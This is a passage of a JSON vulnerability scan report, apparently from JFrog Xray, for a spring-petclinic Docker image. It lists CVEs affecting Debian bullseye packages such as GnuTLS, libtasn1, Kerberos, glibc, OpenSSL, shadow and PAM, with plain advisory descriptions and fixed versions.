         "summary": "A flaw was found in GnuTLS, which relies on libtasn1 for ASN.1 data processing. Due to an inefficient algorithm in libtasn1, decoding certain DER-encoded certificate data can take excessive time, leading to increased resource consumption. This flaw allows a remote attacker to send a specially crafted certificate, causing GnuTLS to become unresponsive or slow, resulting in a denial-of-service condition.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libgnutls30",
         "source_id": "deb://debian:bullseye:libgnutls30",
         "source_comp_id": "deb://debian:bullseye:libgnutls30:3.7.1-5",
         "component_versions": {
            "id": "debian:bullseye:gnutls28",
            "vulnerable_versions": [
               "< 3.7.1-5+deb11u7"
            ],
            "fixed_versions": [
               "3.7.1-5+deb11u7"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-12243"
                  }
               ],
               "description": "A flaw was found in GnuTLS, which relies on libtasn1 for ASN.1 data processing. Due to an inefficient algorithm in libtasn1, decoding certain DER-encoded certificate data can take excessive time, leading to increased resource consumption. This flaw allows a remote attacker to send a specially crafted certificate, causing GnuTLS to become unresponsive or slow, resulting in a denial-of-service condition.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-12243",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-670027",
         "severity": "Unknown",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "A flaw in libtasn1 causes inefficient handling of specific certificate data. When processing a large number of elements in a certificate, libtasn1 takes much longer than expected, which can slow down or even crash the system. This flaw allows an attacker to send a specially crafted certificate, causing a denial of service attack.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libtasn1-6",
         "source_id": "deb://debian:bullseye:libtasn1-6",
         "source_comp_id": "deb://debian:bullseye:libtasn1-6:4.16.0-2",
         "component_versions": {
            "id": "debian:bullseye:libtasn1-6",
            "vulnerable_versions": [
               "< 4.16.0-2+deb11u2"
            ],
            "fixed_versions": [
               "4.16.0-2+deb11u2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-12133"
                  }
               ],
               "description": "A flaw in libtasn1 causes inefficient handling of specific certificate data. When processing a large number of elements in a certificate, libtasn1 takes much longer than expected, which can slow down or even crash the system. This flaw allows an attacker to send a specially crafted certificate, causing a denial of service attack.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-12133",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-669007",
         "severity": "Unknown",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "CVE-2025-24528",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libk5crypto3",
         "source_id": "deb://debian:bullseye:libk5crypto3",
         "source_comp_id": "deb://debian:bullseye:libk5crypto3:1.18.3-6+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:krb5",
            "vulnerable_versions": [
               "< 1.18.3-6+deb11u6"
            ],
            "fixed_versions": [
               "1.18.3-6+deb11u6"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2025-24528"
                  }
               ],
               "description": "CVE-2025-24528",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2025-24528",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-669007",
         "severity": "Unknown",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "CVE-2025-24528",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libkrb5-3",
         "source_id": "deb://debian:bullseye:libkrb5-3",
         "source_comp_id": "deb://debian:bullseye:libkrb5-3:1.18.3-6+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:krb5",
            "vulnerable_versions": [
               "< 1.18.3-6+deb11u6"
            ],
            "fixed_versions": [
               "1.18.3-6+deb11u6"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2025-24528"
                  }
               ],
               "description": "CVE-2025-24528",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2025-24528",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-669007",
         "severity": "Unknown",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "CVE-2025-24528",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libkrb5support0",
         "source_id": "deb://debian:bullseye:libkrb5support0",
         "source_comp_id": "deb://debian:bullseye:libkrb5support0:1.18.3-6+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:krb5",
            "vulnerable_versions": [
               "< 1.18.3-6+deb11u6"
            ],
            "fixed_versions": [
               "1.18.3-6+deb11u6"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2025-24528"
                  }
               ],
               "description": "CVE-2025-24528",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2025-24528",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-669007",
         "severity": "Unknown",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "CVE-2025-24528",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libgssapi-krb5-2",
         "source_id": "deb://debian:bullseye:libgssapi-krb5-2",
         "source_comp_id": "deb://debian:bullseye:libgssapi-krb5-2:1.18.3-6+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:krb5",
            "vulnerable_versions": [
               "< 1.18.3-6+deb11u6"
            ],
            "fixed_versions": [
               "1.18.3-6+deb11u6"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2025-24528"
                  }
               ],
               "description": "CVE-2025-24528",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2025-24528",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-668012",
         "severity": "Unknown",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "When the assert() function in the GNU C Library versions 2.13 to 2.40 fails, it does not allocate enough space for the assertion failure message string and size information, which may lead to a buffer overflow if the message string size aligns to page size.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libc6",
         "source_id": "deb://debian:bullseye:libc6",
         "source_comp_id": "deb://debian:bullseye:libc6:2.31-13+deb11u3",
         "component_versions": {
            "id": "debian:bullseye:glibc",
            "vulnerable_versions": [
               "< 2.31-13+deb11u12"
            ],
            "fixed_versions": [
               "2.31-13+deb11u12"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2025-0395"
                  }
               ],
               "description": "When the assert() function in the GNU C Library versions 2.13 to 2.40 fails, it does not allocate enough space for the assertion failure message string and size information, which may lead to a buffer overflow if the message string size aligns to page size.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2025-0395",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-668012",
         "severity": "Unknown",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "When the assert() function in the GNU C Library versions 2.13 to 2.40 fails, it does not allocate enough space for the assertion failure message string and size information, which may lead to a buffer overflow if the message string size aligns to page size.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libc-bin",
         "source_id": "deb://debian:bullseye:libc-bin",
         "source_comp_id": "deb://debian:bullseye:libc-bin:2.31-13+deb11u3",
         "component_versions": {
            "id": "debian:bullseye:glibc",
            "vulnerable_versions": [
               "< 2.31-13+deb11u12"
            ],
            "fixed_versions": [
               "2.31-13+deb11u12"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2025-0395"
                  }
               ],
               "description": "When the assert() function in the GNU C Library versions 2.13 to 2.40 fails, it does not allocate enough space for the assertion failure message string and size information, which may lead to a buffer overflow if the message string size aligns to page size.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2025-0395",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-667693",
         "severity": "Unknown",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "Issue summary: A timing side-channel which could potentially allow recovering\nthe private key exists in the ECDSA signature computation.\n\nImpact summary: A timing side-channel in ECDSA signature computations\ncould allow recovering the private key by an attacker. However, measuring\nthe timing would require either local access to the signing application or\na very fast network connection with low latency.\n\nThere is a timing signal of around 300 nanoseconds when the top word of\nthe inverted ECDSA nonce value is zero. This can happen with significant\nprobability only for some of the supported elliptic curves. In particular\nthe NIST P-521 curve is affected. To be able to measure this leak, the attacker\nprocess must either be located in the same physical computer or must\nhave a very fast network connection with low latency. For that reason\nthe severity of this vulnerability is Low.\n\nThe FIPS modules in 3.4, 3.3, 3.2, 3.1 and 3.0 are affected by this issue.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:openssl",
         "source_id": "deb://debian:bullseye:openssl",
         "source_comp_id": "deb://debian:bullseye:openssl:1.1.1n-0+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:openssl",
            "vulnerable_versions": [
               "< 1.1.1w-0+deb11u3"
            ],
            "fixed_versions": [
               "1.1.1w-0+deb11u3"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-13176"
                  }
               ],
               "description": "Issue summary: A timing side-channel which could potentially allow recovering the private key exists in the ECDSA signature computation.  Impact summary: A timing side-channel in ECDSA signature computations could allow recovering the private key by an attacker. However, measuring the timing would require either local access to the signing application or a very fast network connection with low latency.  There is a timing signal of around 300 nanoseconds when the top word of the inverted ECDSA nonce value is zero. This can happen with significant probability only for some of the supported elliptic curves. In particular the NIST P-521 curve is affected. To be able to measure this leak, the attacker process must either be located in the same physical computer or must have a very fast network connection with low latency. For that reason the severity of this vulnerability is Low.  The FIPS modules in 3.4, 3.3, 3.2, 3.1 and 3.0 are affected by this issue.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-13176",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-667693",
         "severity": "Unknown",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "Issue summary: A timing side-channel which could potentially allow recovering\nthe private key exists in the ECDSA signature computation.\n\nImpact summary: A timing side-channel in ECDSA signature computations\ncould allow recovering the private key by an attacker. However, measuring\nthe timing would require either local access to the signing application or\na very fast network connection with low latency.\n\nThere is a timing signal of around 300 nanoseconds when the top word of\nthe inverted ECDSA nonce value is zero. This can happen with significant\nprobability only for some of the supported elliptic curves. In particular\nthe NIST P-521 curve is affected. To be able to measure this leak, the attacker\nprocess must either be located in the same physical computer or must\nhave a very fast network connection with low latency. For that reason\nthe severity of this vulnerability is Low.\n\nThe FIPS modules in 3.4, 3.3, 3.2, 3.1 and 3.0 are affected by this issue.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libssl1.1",
         "source_id": "deb://debian:bullseye:libssl1.1",
         "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:openssl",
            "vulnerable_versions": [
               "< 1.1.1w-0+deb11u3"
            ],
            "fixed_versions": [
               "1.1.1w-0+deb11u3"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-13176"
                  }
               ],
               "description": "Issue summary: A timing side-channel which could potentially allow recovering the private key exists in the ECDSA signature computation.  Impact summary: A timing side-channel in ECDSA signature computations could allow recovering the private key by an attacker. However, measuring the timing would require either local access to the signing application or a very fast network connection with low latency.  There is a timing signal of around 300 nanoseconds when the top word of the inverted ECDSA nonce value is zero. This can happen with significant probability only for some of the supported elliptic curves. In particular the NIST P-521 curve is affected. To be able to measure this leak, the attacker process must either be located in the same physical computer or must have a very fast network connection with low latency. For that reason the severity of this vulnerability is Low.  The FIPS modules in 3.4, 3.3, 3.2, 3.1 and 3.0 are affected by this issue.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-13176",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-662146",
         "severity": "Unknown",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "shadow-utils (aka shadow) 4.4 through 4.17.0 establishes a default /etc/subuid behavior (e.g., uid 100000 through 165535 for the first user account) that can realistically conflict with the uids of users defined on locally administered networks, potentially leading to account takeover, e.g., by leveraging newuidmap for access to an NFS home directory (or same-host resources in the case of remote logins by these local network users). NOTE: it may also be argued that system administrators should not have assigned uids, within local networks, that are within the range that can occur in /etc/subuid.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:login",
         "source_id": "deb://debian:bullseye:login",
         "source_comp_id": "deb://debian:bullseye:login:1:4.8.1-1",
         "component_versions": {
            "id": "debian:bullseye:shadow",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-56433"
                  }
               ],
               "description": "shadow-utils (aka shadow) 4.4 through 4.17.0 establishes a default /etc/subuid behavior (e.g., uid 100000 through 165535 for the first user account) that can realistically conflict with the uids of users defined on locally administered networks, potentially leading to account takeover, e.g., by leveraging newuidmap for access to an NFS home directory (or same-host resources in the case of remote logins by these local network users). NOTE: it may also be argued that system administrators should not have assigned uids, within local networks, that are within the range that can occur in /etc/subuid.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-56433",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-662146",
         "severity": "Unknown",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "shadow-utils (aka shadow) 4.4 through 4.17.0 establishes a default /etc/subuid behavior (e.g., uid 100000 through 165535 for the first user account) that can realistically conflict with the uids of users defined on locally administered networks, potentially leading to account takeover, e.g., by leveraging newuidmap for access to an NFS home directory (or same-host resources in the case of remote logins by these local network users). NOTE: it may also be argued that system administrators should not have assigned uids, within local networks, that are within the range that can occur in /etc/subuid.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:passwd",
         "source_id": "deb://debian:bullseye:passwd",
         "source_comp_id": "deb://debian:bullseye:passwd:1:4.8.1-1",
         "component_versions": {
            "id": "debian:bullseye:shadow",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-56433"
                  }
               ],
               "description": "shadow-utils (aka shadow) 4.4 through 4.17.0 establishes a default /etc/subuid behavior (e.g., uid 100000 through 165535 for the first user account) that can realistically conflict with the uids of users defined on locally administered networks, potentially leading to account takeover, e.g., by leveraging newuidmap for access to an NFS home directory (or same-host resources in the case of remote logins by these local network users). NOTE: it may also be argued that system administrators should not have assigned uids, within local networks, that are within the range that can occur in /etc/subuid.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-56433",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-648833",
         "severity": "Unknown",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "A vulnerability was found in PAM. The secret information is stored in memory, where the attacker can trigger the victim program to execute by sending characters to its standard input (stdin). As this occurs, the attacker can train the branch predictor to execute an ROP chain speculatively. This flaw could result in leaked passwords, such as those found in /etc/shadow while performing authentications.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libpam-modules-bin",
         "source_id": "deb://debian:bullseye:libpam-modules-bin",
         "source_comp_id": "deb://debian:bullseye:libpam-modules-bin:1.4.0-9+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:pam",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-10041"
                  }
               ],
               "description": "A vulnerability was found in PAM. The secret information is stored in memory, where the attacker can trigger the victim program to execute by sending characters to its standard input (stdin). As this occurs, the attacker can train the branch predictor to execute an ROP chain speculatively. This flaw could result in leaked passwords, such as those found in /etc/shadow while performing authentications.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-10041",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-648833",
         "severity": "Unknown",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "A vulnerability was found in PAM. The secret information is stored in memory, where the attacker can trigger the victim program to execute by sending characters to its standard input (stdin). As this occurs, the attacker can train the branch predictor to execute an ROP chain speculatively. This flaw could result in leaked passwords, such as those found in /etc/shadow while performing authentications.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libpam0g",
         "source_id": "deb://debian:bullseye:libpam0g",
         "source_comp_id": "deb://debian:bullseye:libpam0g:1.4.0-9+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:pam",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-10041"
                  }
               ],
               "description": "A vulnerability was found in PAM. The secret information is stored in memory, where the attacker can trigger the victim program to execute by sending characters to its standard input (stdin). As this occurs, the attacker can train the branch predictor to execute an ROP chain speculatively. This flaw could result in leaked passwords, such as those found in /etc/shadow while performing authentications.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-10041",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-648833",
         "severity": "Unknown",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "A vulnerability was found in PAM. The secret information is stored in memory, where the attacker can trigger the victim program to execute by sending characters to its standard input (stdin). As this occurs, the attacker can train the branch predictor to execute an ROP chain speculatively. This flaw could result in leaked passwords, such as those found in /etc/shadow while performing authentications.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libpam-runtime",
         "source_id": "deb://debian:bullseye:libpam-runtime",
         "source_comp_id": "deb://debian:bullseye:libpam-runtime:1.4.0-9+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:pam",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-10041"
                  }
               ],
               "description": "A vulnerability was found in PAM. The secret information is stored in memory, where the attacker can trigger the victim program to execute by sending characters to its standard input (stdin). As this occurs, the attacker can train the branch predictor to execute an ROP chain speculatively. This flaw could result in leaked passwords, such as those found in /etc/shadow while performing authentications.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-10041",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-648833",
         "severity": "Unknown",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "A vulnerability was found in PAM. The secret information is stored in memory, where the attacker can trigger the victim program to execute by sending characters to its standard input (stdin). As this occurs, the attacker can train the branch predictor to execute an ROP chain speculatively. This flaw could result in leaked passwords, such as those found in /etc/shadow while performing authentications.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libpam-modules",
         "source_id": "deb://debian:bullseye:libpam-modules",
         "source_comp_id": "deb://debian:bullseye:libpam-modules:1.4.0-9+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:pam",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-10041"
                  }
               ],
               "description": "A vulnerability was found in PAM. The secret information is stored in memory, where the attacker can trigger the victim program to execute by sending characters to its standard input (stdin). As this occurs, the attacker can train the branch predictor to execute an ROP chain speculatively. This flaw could result in leaked passwords, such as those found in /etc/shadow while performing authentications.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-10041",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-599390",
         "severity": "Unknown",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "nscd: netgroup cache assumes NSS callback uses in-buffer strings\n\nThe Name Service Cache Daemon's (nscd) netgroup cache can corrupt memory\nwhen the NSS callback does not store all strings in the provided buffer.\nThe flaw was introduced in glibc 2.15 when the cache was added to nscd.\n\nThis vulnerability is only present in the nscd binary.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libc-bin",
         "source_id": "deb://debian:bullseye:libc-bin",
         "source_comp_id": "deb://debian:bullseye:libc-bin:2.31-13+deb11u3",
         "component_versions": {
            "id": "debian:bullseye:glibc",
            "vulnerable_versions": [
               "< 2.31-13+deb11u10"
            ],
            "fixed_versions": [
               "2.31-13+deb11u10"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-33602"
                  }
               ],
               "description": "nscd: netgroup cache assumes NSS callback uses in-buffer strings  The Name Service Cache Daemon's (nscd) netgroup cache can corrupt memory when the NSS callback does not store all strings in the provided buffer. The flaw was introduced in glibc 2.15 when the cache was added to nscd.  This vulnerability is only present in the nscd binary.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-33602",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-599390",
         "severity": "Unknown",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "nscd: netgroup cache assumes NSS callback uses in-buffer strings\n\nThe Name Service Cache Daemon's (nscd) netgroup cache can corrupt memory\nwhen the NSS callback does not store all strings in the provided buffer.\nThe flaw was introduced in glibc 2.15 when the cache was added to nscd.\n\nThis vulnerability is only present in the nscd binary.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libc6",
         "source_id": "deb://debian:bullseye:libc6",
         "source_comp_id": "deb://debian:bullseye:libc6:2.31-13+deb11u3",
         "component_versions": {
            "id": "debian:bullseye:glibc",
            "vulnerable_versions": [
               "< 2.31-13+deb11u10"
            ],
            "fixed_versions": [
               "2.31-13+deb11u10"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-33602"
                  }
               ],
               "description": "nscd: netgroup cache assumes NSS callback uses in-buffer strings  The Name Service Cache Daemon's (nscd) netgroup cache can corrupt memory when the NSS callback does not store all strings in the provided buffer. The flaw was introduced in glibc 2.15 when the cache was added to nscd.  This vulnerability is only present in the nscd binary.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-33602",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-599389",
         "severity": "Unknown",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "nscd: netgroup cache may terminate daemon on memory allocation failure\n\nThe Name Service Cache Daemon's (nscd) netgroup cache uses xmalloc or\nxrealloc and these functions may terminate the process due to a memory\nallocation failure resulting in a denial of service to the clients.  The\nflaw was introduced in glibc 2.15 when the cache was added to nscd.\n\nThis vulnerability is only present in the nscd binary.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libc6",
         "source_id": "deb://debian:bullseye:libc6",
         "source_comp_id": "deb://debian:bullseye:libc6:2.31-13+deb11u3",
         "component_versions": {
            "id": "debian:bullseye:glibc",
            "vulnerable_versions": [
               "< 2.31-13+deb11u10"
            ],
            "fixed_versions": [
               "2.31-13+deb11u10"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-33601"
                  }
               ],
               "description": "nscd: netgroup cache may terminate daemon on memory allocation failure  The Name Service Cache Daemon's (nscd) netgroup cache uses xmalloc or xrealloc and these functions may terminate the process due to a memory allocation failure resulting in a denial of service to the clients.  The flaw was introduced in glibc 2.15 when the cache was added to nscd.  This vulnerability is only present in the nscd binary.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-33601",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-599389",
         "severity": "Unknown",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "nscd: netgroup cache may terminate daemon on memory allocation failure\n\nThe Name Service Cache Daemon's (nscd) netgroup cache uses xmalloc or\nxrealloc and these functions may terminate the process due to a memory\nallocation failure resulting in a denial of service to the clients.  The\nflaw was introduced in glibc 2.15 when the cache was added to nscd.\n\nThis vulnerability is only present in the nscd binary.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libc-bin",
         "source_id": "deb://debian:bullseye:libc-bin",
         "source_comp_id": "deb://debian:bullseye:libc-bin:2.31-13+deb11u3",
         "component_versions": {
            "id": "debian:bullseye:glibc",
            "vulnerable_versions": [
               "< 2.31-13+deb11u10"
            ],
            "fixed_versions": [
               "2.31-13+deb11u10"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-33601"
                  }
               ],
               "description": "nscd: netgroup cache may terminate daemon on memory allocation failure  The Name Service Cache Daemon's (nscd) netgroup cache uses xmalloc or xrealloc and these functions may terminate the process due to a memory allocation failure resulting in a denial of service to the clients.  The flaw was introduced in glibc 2.15 when the cache was added to nscd.  This vulnerability is only present in the nscd binary.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-33601",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-597548",
